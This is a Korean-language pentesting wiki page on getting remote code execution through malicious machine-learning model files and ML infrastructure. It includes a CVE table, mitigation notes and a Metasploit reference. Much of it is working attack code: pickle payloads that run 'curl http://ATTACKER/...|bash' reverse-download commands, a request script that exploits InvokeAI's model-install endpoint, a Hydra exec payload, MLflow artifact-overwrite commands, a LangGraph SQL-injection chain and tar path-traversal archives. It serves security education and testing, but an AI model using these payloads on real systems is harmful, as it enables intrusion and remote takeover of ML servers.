# Models RCE

{{#include ../banners/hacktricks-training.md}}

## 모델을 로드해 RCE 실행

Machine Learning 모델은 보통 ONNX, TensorFlow, PyTorch 등 여러 형식으로 공유됩니다. 개발자 머신이나 프로덕션 시스템에서 사용하기 위해 이러한 모델을 로드할 수 있습니다. 일반적으로 모델에는 악성 코드가 포함되어서는 안 되지만, 의도된 기능으로 시스템에서 임의의 코드를 실행하거나 모델 로딩 라이브러리의 취약점으로 인해 모델이 임의 코드 실행에 악용되는 경우가 있습니다.

다음 표에는 이 범주에 속하는 대표적인 취약점이 나와 있습니다.

| **Framework / Tool**        | **취약점 (가능한 경우 CVE)**                                                    | **RCE 벡터**                                                                                                                           | **참고 자료**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load`의 안전하지 않은 역직렬화* **(CVE-2025-32434)**                                                              | 악성 pickle이 모델 체크포인트에서 코드 실행으로 이어짐 (`weights_only` 보호 기능 우회)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 악성 모델 다운로드로 코드 실행; 관리 API에서 Java 역직렬화 RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`를 통한 안전하지 않은 체크포인트 역직렬화 **(CVE-2025-23298)**                                           | 신뢰할 수 없는 체크포인트가 `load_model_trainer_states_from_checkpoint` 중 pickle reducer를 트리거하여 ML worker에서 코드 실행            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 안전하지 않은 MessagePack 확장 훅 **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | 사용자가 제어하는 `filter` 키가 SQL/JSON-path 구문을 삽입하고, `UNION SELECT`가 가짜 체크포인트 행을 만들어낸 뒤 `msgpack` 역직렬화가 공격자가 선택한 Python 코드를 가져와 호출함 | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (안전하지 않은 YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML에서 모델을 로드할 때 `yaml.unsafe_load`를 사용함 (코드 실행) <br> **Lambda** layer가 있는 모델을 로드하면 임의의 Python 코드가 실행됨          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite 파싱)                                                                                          | 조작된 `.tflite` 모델이 정수 오버플로를 유발해 heap 손상으로 이어짐 (잠재적 RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`로 모델을 로드하면 공격자의 `__reduce__` payload가 포함된 pickle이 실행됨                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (안전하지 않은 `np.load`) *논란 있음*                                                                              | `numpy.load`는 기본적으로 pickle된 객체 배열을 허용했으며, 악성 `.npy/.npz`가 코드 실행을 유발함                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (디렉터리 탐색) <br> **CVE-2024-5187** (tar 탐색)                                                    | ONNX 모델의 외부 가중치 경로가 디렉터리 밖으로 벗어나 임의 파일을 읽을 수 있음 <br> 악성 ONNX model tar가 임의 파일을 덮어쓸 수 있음 (RCE로 이어짐) | |
| ONNX Runtime (설계상 위험)  | *(CVE 없음)* ONNX custom ops / control flow                                                                                    | custom operator가 포함된 모델은 공격자의 native code를 로드해야 함; 복잡한 모델 그래프가 로직을 악용해 의도치 않은 연산을 실행할 수 있음   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (경로 탐색)                                                                                          | `--model-control`이 활성화된 상태에서 model-load API를 사용하면 상대 경로 탐색으로 파일을 쓸 수 있음 (예: RCE를 위해 `.bashrc` 덮어쓰기)    | |
| **GGML (GGUF 형식)**      | **CVE-2024-25664 … 25668** (여러 heap overflow)                                                                         | 잘못된 형식의 GGUF 모델 파일이 parser에서 heap buffer overflow를 일으켜 피해자 시스템에서 임의 코드 실행을 가능하게 함                     | |
| **Keras (이전 형식)**   | *(신규 CVE 없음)* Legacy Keras H5 모델                                                                                         | Lambda layer가 포함된 악성 HDF5 (`.h5`) 모델은 로드 시 여전히 코드를 실행함 (Keras safe_mode는 이전 형식에 적용되지 않음 – “downgrade attack”) | |
| **기타** (일반)        | *설계 결함* – Pickle serialization                                                                                         | pickle 기반 모델 형식이나 Python `pickle.load` 등 다수의 ML 도구는 완화 조치가 없으면 모델 파일에 포함된 임의 코드를 실행함 | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 신뢰할 수 없는 metadata를 `hydra.utils.instantiate()`에 전달 **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 공격자가 제어하는 모델 metadata/config가 `_target_`을 임의의 callable (예: `builtins.exec`)로 설정해 “안전한” 형식 (`.safetensors`, `.nemo`, repo `config.json`)에서도 로드 중 실행되도록 함 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

또한 [PyTorch](https://github.com/pytorch/pytorch/security)에서 사용되는 것과 같은 Python pickle 기반 모델 중에는 `weights_only=True`로 로드하지 않을 경우 시스템에서 임의의 코드를 실행하는 데 악용될 수 있는 모델이 있습니다. 따라서 표에 나열되지 않았더라도 pickle 기반 모델은 이러한 유형의 공격에 특히 취약할 수 있습니다.

### Hydra metadata → RCE (safetensors에서도 작동)

`hydra.utils.instantiate()`는 설정/metadata 객체에 있는 점으로 구분된 `_target_`을 가져와 호출합니다. Hugging Face Transformers와 같은 라이브러리가 **신뢰할 수 없는 모델 metadata**를 `instantiate()`에 전달하면, 공격자는 모델을 로드하는 즉시 실행되는 callable과 인수를 제공할 수 있습니다 (pickle 불필요).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload 예시 (`.nemo` `model_config.yaml`, repo `config.json` 또는 `.safetensors` 내부의 `__metadata__`에서 작동):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, FlexTok loaders에서 model 초기화 전에 트리거됩니다.
- Hydra의 string block-list는 대체 import 경로(예: `enum.bltns.eval`) 또는 애플리케이션에서 확인된 이름(예: `nemo.core.classes.common.os.system` → `posix`)을 사용해 우회할 수 있습니다.<sup>[[14]](#references)</sup>
- FlexTok은 문자열로 표현된 metadata도 `ast.literal_eval`로 파싱하므로, Hydra 호출 전에 DoS(CPU/메모리 폭증)를 유발할 수 있습니다.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI`는 Stable-Diffusion용으로 널리 사용되는 오픈 소스 웹 인터페이스입니다. **5.3.1 – 5.4.2** 버전은 사용자가 임의의 URL에서 모델을 다운로드하고 로드할 수 있게 하는 REST endpoint `/api/v2/models/install`을 노출합니다.<sup>[[1]](#references)</sup>

내부적으로 이 endpoint는 결국 다음을 호출합니다:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

제공된 파일이 **PyTorch 체크포인트(`*.ckpt`)**인 경우, `torch.load`는 **pickle 역직렬화**를 수행합니다. 콘텐츠가 사용자 제어 URL에서 직접 전달되므로, 공격자는 체크포인트에 사용자 지정 `__reduce__` 메서드가 포함된 악성 객체를 삽입할 수 있습니다. 이 메서드는 **역직렬화 중에 실행**되어 InvokeAI 서버에서 **원격 코드 실행(RCE)** 으로 이어집니다.

이 취약점에는 **CVE-2024-12029**가 할당되었습니다(CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. 악성 체크포인트 생성:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt`를 직접 제어하는 HTTP 서버에 호스팅합니다(예: `http://ATTACKER/payload.ckpt`).
3. 취약한 엔드포인트를 트리거합니다(인증 필요 없음):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI가 파일을 다운로드하면 `torch.load()`를 호출하고 → `os.system` gadget이 실행되어 공격자가 InvokeAI 프로세스의 컨텍스트에서 코드를 실행할 수 있습니다.

바로 사용할 수 있는 exploit: **Metasploit** 모듈 `exploit/linux/http/invokeai_rce_cve_2024_12029`이 전체 과정을 자동화합니다.<sup>[[3]](#references)</sup>

#### 조건

•  InvokeAI 5.3.1-5.4.2 (scan flag 기본값 **false**)
•  공격자가 `/api/v2/models/install`에 접근할 수 있음
•  프로세스에 shell 명령을 실행할 권한이 있음

#### 완화 방법

* **InvokeAI ≥ 5.4.3**으로 업그레이드 – 패치에서 기본적으로 `scan=True`를 설정하고 deserialization 전에 malware scanning을 수행합니다.<sup>[[2]](#references)</sup>
* 체크포인트를 프로그래밍 방식으로 로드할 때는 `torch.load(file, weights_only=True)` 또는 새로운 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper를 사용하세요.
* 모델 소스에 allow-list / signature를 적용하고, 최소 권한으로 서비스를 실행하세요.

> ⚠️ 신뢰할 수 없는 소스의 Python pickle 기반 형식(많은 `.pt`, `.pkl`, `.ckpt`, `.pth` 파일 포함)은 무엇이든 deserialization하는 것은 본질적으로 안전하지 않다는 점을 기억하세요.

---

이전 버전의 InvokeAI를 reverse proxy 뒤에서 계속 실행해야 하는 경우 사용할 수 있는 임시 완화 방법 예시:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec의 unsafe `torch.load`를 통한 RCE (CVE-2025-23298)

NVIDIA의 Transformers4Rec(Merlin의 일부)는 사용자가 제공한 경로에 대해 `torch.load()`를 직접 호출하는 취약한 checkpoint loader를 노출했습니다. `torch.load`는 Python `pickle`에 의존하므로, 공격자가 제어하는 checkpoint는 deserialization 중 reducer를 통해 임의의 코드를 실행할 수 있습니다.<sup>[[5]](#references)</sup>

취약한 경로(패치 전): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

RCE로 이어지는 이유: Python pickle에서 객체는 callable과 인수를 반환하는 reducer(`__reduce__`/`__setstate__`)를 정의할 수 있습니다. 해당 callable은 unpickling 중에 실행됩니다. 이런 객체가 checkpoint에 포함되어 있으면, 가중치를 사용하기 전에 실행됩니다.

최소 악성 checkpoint 예시:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

전달 벡터 및 피해 범위:
- repos, buckets 또는 artifact registries를 통해 공유되는 트로이목마화된 체크포인트/모델
- 체크포인트를 자동으로 로드하는 자동화된 resume/deploy 파이프라인
- 실행은 training/inference workers 내부에서 이루어지며, 권한이 높은 경우가 많음(예: 컨테이너의 root)

수정: 커밋 [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)(PR #802)에서 직접적인 `torch.load()`를 `transformers4rec/utils/serialization.py`에 구현된 제한적이고 허용 목록 기반인 역직렬화기로 대체했습니다. 새로운 로더는 유형/필드를 검증하고 로드 중 임의의 callable이 호출되는 것을 방지합니다.<sup>[[7]](#references)</sup>

PyTorch 체크포인트에 대한 방어 지침:
- 신뢰할 수 없는 데이터를 unpickle하지 마세요. 가능하면 [Safetensors](https://huggingface.co/docs/safetensors/index) 또는 ONNX와 같은 실행 불가능한 형식을 사용하세요.
- PyTorch 직렬화를 사용해야 한다면 `weights_only=True`(최신 PyTorch에서 지원)를 사용하거나 Transformers4Rec 패치와 유사한 사용자 지정 허용 목록 기반 unpickler를 사용하세요.<sup>[[4]](#references)</sup>
- 모델 출처/서명을 검증하고 역직렬화를 sandbox에서 수행하세요(seccomp/AppArmor, non-root 사용자, 제한된 FS, 네트워크 송신 차단).
- 체크포인트 로드 시 ML 서비스에서 예기치 않은 자식 프로세스가 생성되는지 모니터링하고 `torch.load()`/`pickle` 사용을 추적하세요.

POC 및 취약/패치 참고 자료:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- 패치 전 취약한 로더: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 악성 체크포인트 POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- 패치 후 로더: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 예시 – 악성 PyTorch 모델 제작하기

- 모델 생성:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- 모델 로드:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Tencent FaceDetection-DSFD resnet 역직렬화 (CVE-2025-13715 / ZDI-25-1183)

Tencent의 FaceDetection-DSFD는 사용자가 제어하는 데이터를 역직렬화하는 `resnet` endpoint를 노출합니다. ZDI는 원격 공격자가 피해자가 악성 페이지/파일을 로드하도록 유도하고, 해당 페이지/파일이 조작된 직렬화 blob을 endpoint로 전송하게 한 뒤, `root` 권한으로 역직렬화를 트리거해 시스템을 완전히 장악할 수 있음을 확인했습니다.

이 exploit 흐름은 일반적인 pickle 악용 방식과 유사합니다:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

역직렬화 중에 접근할 수 있는 모든 gadget(생성자, `__setstate__`, 프레임워크 콜백 등)은 전송 수단이 HTTP, WebSocket, 감시 중인 디렉터리에 놓인 파일 중 무엇이든 같은 방식으로 무기화할 수 있습니다.



### LangGraph checkpointer SQLi → MessagePack RCE

이 공격 체인이 흥미로운 이유는 공격자가 **악성 모델 파일을 업로드할 필요가 없기 때문입니다**. 대신 애플리케이션이 **AI 에이전트 영속성 API**(`get_state_history(..., filter=...)`)를 노출하고, 사용자 입력이 checkpointer 쿼리 빌더에 전달됩니다.

#### 1. 메타데이터 필터의 구조적 SQLi

취약한 SQLite 패턴은 다음과 같았습니다:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

The 값은 나중에 바인딩되지만, `query_key`는 **JSON path 문자열**에 연결되므로 dictionary key 안의 `'`가 `'$.{query_key}'`에서 벗어나 SQL을 삽입합니다. 같은 교훈은 **JSON paths, identifiers, operators, `LIMIT`, TTL fields**에도 적용됩니다. placeholders는 값만 보호하며 쿼리의 구조적 구문은 보호하지 않습니다.

#### 2. `UNION SELECT`는 데이터 탈취뿐 아니라 다운스트림 sink도 노릴 수 있습니다

쿼리는 `type`과 직렬화된 `checkpoint` bytes를 반환하며, 이 값들은 나중에 다음과 같이 사용됩니다:

```python
self.serde.loads_typed((type, checkpoint))
```

이는 `WHERE` 절의 SQLi로 **가짜 결과 행**을 삽입할 수 있다는 뜻입니다:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

나중에 코드가 선택된 컬럼을 파싱, 역직렬화, 기록 또는 실행한다면 해당 컬럼을 각각의 sink에 매핑하세요. 이 경우 가짜 행을 통해 SQLi가 **attacker-controlled deserialization**로 이어집니다.

#### 3. Unsafe MessagePack extension hook은 code gadget과 동등합니다

LangGraph의 `msgpack` 경로는 중첩된 튜플을 언팩하고 다음을 실행하는 사용자 지정 extension hook을 사용했습니다:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

따라서 `("os", "system", "id > /tmp/pwned")`와 동등한 내용을 인코딩한 MessagePack extension object는 `os`를 import하고, `system`을 찾은 뒤 명령을 실행합니다. AI 프레임워크를 검토할 때는 동적 import, reflection 또는 임의의 callable dispatch를 수행하는 **custom MessagePack/JSON/pickle revivers**를 살펴보세요.

#### 4. Agent 프레임워크의 실용적인 audit 패턴

사용자 제어 입력이 다음 항목에 도달하는지 검토하세요.
- state history / memory / replay / checkpoint 목록 API
- SQL 또는 Redis query 조각을 생성하는 구조화된 filter builder
- custom deserializer (`pickle`, `msgpack`, `json` object hook, YAML constructor)
- persistence layer에서 반환한 row를 신뢰하는 recovery 경로

이 특정 chain은 신뢰할 수 없는 사용자가 `filter`를 제어할 수 있는 **SQLite** 또는 **Redis** checkpointer를 사용하는 self-hosted LangGraph 배포 환경에 영향을 미쳤습니다. 공개된 내용에 따르면 패치된 버전은 `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, `langgraph-checkpoint 4.0.1+`입니다.<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact 덮어쓰기를 통한 pickle RCE

`PythonModel`로 만든 MLflow PyFunc는 직렬화된 객체를 `python_model.pkl`로 저장할 수 있습니다. 모델 metadata는 `mlflow.pyfunc.model`을 loader로 지정하며, MLflow 구현에서는 저장된 Python model에 이 파일명을 사용합니다. 따라서 artifact store에 대한 쓰기 권한은 이후 해당 모델을 로드하는 다른 애플리케이션에서의 code execution으로 이어질 수 있습니다.<sup>[[17]](#references)[[18]](#references)</sup>

유용한 chain은 **artifact 쓰기 권한 → pickle 교체 → inference consumer가 다시 로드하도록 유도**입니다. proxied `mlflow-artifacts:/...` root를 사용하는 experiment의 경우 experiment, run 및 model artifact 경로를 열거하세요. Tracking server는 `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`에서 `GET`과 `PUT`을 노출합니다.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

최소한의 reducer는 consumer가 artifact를 unpickle하는 즉시 명령을 실행할 수 있습니다. `MLmodel`에 선언된 Python 버전으로 payload를 생성하면 호환성 문제를 방지할 수 있습니다.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

기존 모델을 **로드**하는 작업(예: 예측, scoring 또는 deployment)을 트리거하세요. 먼저 재학습하지 마세요. 학습 과정에서 악성 artifact가 새 모델로 교체될 수 있습니다. 애플리케이션 오류가 발생해도 exploit이 실패했다는 뜻은 아닙니다. reducer가 사용 가능한 모델 대신 명령의 정수 종료 상태를 반환하기 때문입니다. ICMP 또는 HTTP callback처럼 관찰 가능한 부작용부터 확인한 다음 최종 payload로 교체하세요.<sup>[[20]](#references)</sup>

평가 중에는 run을 생성할 권한과 다른 run에 속한 artifact를 덮어쓸 권한을 구분하세요. 인증 및 run별 업데이트 권한을 검토하고, 예상치 못한 `python_model.pkl` 수정 사항을 조사하세요. 모델의 출처와 무결성도 실행 경계의 일부로 취급하세요. 최신 MLflow 코드는 `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` 설정도 지원하며, cloudpickle 데이터를 로드하는 대신 models-from-code artifact를 사용할 것을 권장합니다.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### 노출된 모델 서버 및 ML 인프라

악성 모델을 로드하는 것만이 ML 인프라에서 코드를 실행하는 방법은 아닙니다. job submission API, code-validation endpoint, 그리고 self-hosted AI 서비스의 model registry pull은 모델 파일 없이도 code execution으로 이어질 수 있습니다. [노출된 Self-Hosted AI 서비스](AI-Exposed-Self-Hosted-AI-Services.md)를 참고하세요.

## 모델의 Path Traversal

[**이 블로그 게시물**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)에서 언급했듯이, 여러 AI 프레임워크에서 사용하는 모델 형식은 대부분 archive, 대개 `.zip`을 기반으로 합니다. 따라서 이 형식을 악용해 path traversal 공격을 수행하고, 모델이 로드되는 시스템에서 임의의 파일을 읽을 수 있습니다.<sup>[[16]](#references)</sup>

예를 들어, 다음 코드로 모델을 생성하면 모델이 로드될 때 `/tmp` 디렉터리에 파일을 만들 수 있습니다:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

또는 다음 코드를 사용하면 로드될 때 `/tmp` 디렉터리에 symlink를 생성하는 모델을 만들 수 있습니다:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 심층 분석: Keras .keras 역직렬화와 gadget 탐색

.keras 내부 구조, Lambda-layer RCE, ≤ 3.8에서의 임의 import 문제, 그리고 수정 후 allowlist 내부에서 gadget을 찾는 방법에 대한 집중 가이드는 다음을 참조하세요:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec 블로그 – "CVE-2024-12029 – InvokeAI 신뢰할 수 없는 데이터 역직렬화"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI 패치 커밋 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit 모듈 문서](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load의 보안 고려 사항](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI 블로그 – CVE-2025-23298: NVIDIA Merlin에서 원격 코드 실행 획득](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI 권고문: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec 패치 커밋 b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [패치 전 취약한 loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [악성 checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [패치 후 loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 최신 AI/ML 형식 및 라이브러리를 통한 원격 코드 실행](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate 문서](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra 차단 목록 커밋 (RCE 경고)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi에서 RCE까지: LangGraph의 Checkpointer 악용](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip 버그를 고가치 AI/ML 바운티로 연결하기](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk 권고문 및 PyFunc 개념 증명 – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow 소스 – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – 아티팩트 다운로드 및 업로드 엔드포인트](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
